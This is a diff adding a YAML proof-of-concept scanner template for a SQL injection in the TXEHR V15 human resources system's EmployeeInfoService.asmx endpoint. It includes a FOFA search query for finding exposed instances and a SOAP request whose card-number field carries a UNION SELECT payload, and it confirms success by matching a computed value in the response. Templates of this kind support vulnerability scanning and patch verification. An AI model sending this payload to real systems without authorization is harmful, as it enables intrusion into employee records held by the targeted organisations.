@@ -1,0 +1,37 @@
+id: poc-yaml-tosharesoft-employeeInfoservice-sqli
+info:
+  name: 同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+variables:
+  t1: random_int(100,500)
+  t2: t1 * t1 * t1
+requests:
+- method: POST
+  path: /Service/EmployeeInfoService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetEmployeeByCardNo
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetEmployeeByCardNo xmlns="http://tempuri.org/">
+
+    <strCardNo>1'' UNION ALL SELECT NULL,(select POWER({{.t1}},3)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
+
+    </GetEmployeeByCardNo>
+
+    </soap:Body>
+
+    </soap:Envelope>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
